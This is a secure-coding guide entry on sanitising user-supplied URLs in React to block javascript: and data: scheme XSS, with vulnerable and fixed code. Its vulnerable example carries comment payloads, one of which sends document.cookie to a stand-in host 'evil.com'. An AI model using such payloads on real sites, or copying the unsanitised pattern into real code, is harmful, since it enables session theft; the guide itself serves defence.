# sec-sanitise-urls

> Sanitise URL parameters before using in queries or rendering

## Why It Matters

URLs provided by users or loaded from external data can contain dangerous schemes like `javascript:`, `data:`, or `vbscript:`. When these are rendered as `href` attributes or used in navigation, they execute arbitrary code in the user's browser. This is a common XSS vector that bypasses React's built-in text escaping because the browser treats the entire href value as an instruction.

Validating that URLs use only safe schemes (http or https) and parsing them with the `URL` constructor prevents protocol-based injection. This is especially important for user profile links, redirect URLs from query parameters, and any anchor tag where the destination is not hardcoded.

## Bad

```tsx
interface LinkProps {
  url: string; // From user input or database
  label: string;
}

function UserLink({ url, label }: LinkProps) {
  // User could supply javascript:alert(document.cookie)
  // or data:text/html,<script>...</script>
  return <a href={url}>{label}</a>;
}

function RedirectHandler() {
  const params = new URLSearchParams(window.location.search);
  const returnUrl = params.get("returnUrl") ?? "/";

  // Attacker crafts: ?returnUrl=javascript:void(document.location='evil.com/'+document.cookie)
  return <a href={returnUrl}>Continue</a>;
}
```

## Good

```tsx
function sanitiseUrl(untrusted: string): string {
  try {
    const parsed = new URL(untrusted, window.location.origin);
    if (parsed.protocol === "https:" || parsed.protocol === "http:") {
      return parsed.href;
    }
  } catch {
    // Invalid URL — fall through to safe default
  }
  return "#";
}

interface LinkProps {
  url: string;
  label: string;
}

function UserLink({ url, label }: LinkProps) {
  return (
    <a href={sanitiseUrl(url)} rel="noopener noreferrer">
      {label}
    </a>
  );
}

function RedirectHandler() {
  const params = new URLSearchParams(window.location.search);
  const returnUrl = params.get("returnUrl") ?? "/";

  // Only allow same-origin relative paths for redirects
  const safeUrl = returnUrl.startsWith("/") && !returnUrl.startsWith("//")
    ? returnUrl
    : "/";

  return <a href={safeUrl}>Continue</a>;
}
```

## See Also

- [sec-validate-input](sec-validate-input.md) - Validate user input on both client and server
